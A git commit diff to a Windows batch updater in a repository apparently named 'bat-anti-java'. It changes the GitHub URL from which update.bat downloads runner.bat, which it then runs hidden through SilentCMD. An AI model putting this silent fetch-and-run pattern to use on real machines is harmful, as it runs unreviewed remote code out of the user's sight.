f11278042078e7f5076686356769844bd2f19421
Easty101 <106346360+Easty101@users.noreply.github.com>
2024-07-17 22:43:18 +0200

    Updated the git file paths for update.bat

--- V2/update.bat
+++ V2/update.bat
@@ -1,6 +1,6 @@
 @echo off
 cd %temp%
 cd permanent
-curl -O https://raw.githubusercontent.com/Easty101/bat-anti-java/main/runner.bat
+curl -O https://raw.githubusercontent.com/Easty101/bat-anti-java/main/V2/runner.bat
 start C:\path\to\SilentCMD\SilentCMD.exe %temp%\permanent\runner.bat
 REM !Change 'C:\path\to\SilentCMD\SilentCMD.exe' to your actual path! ################################################################
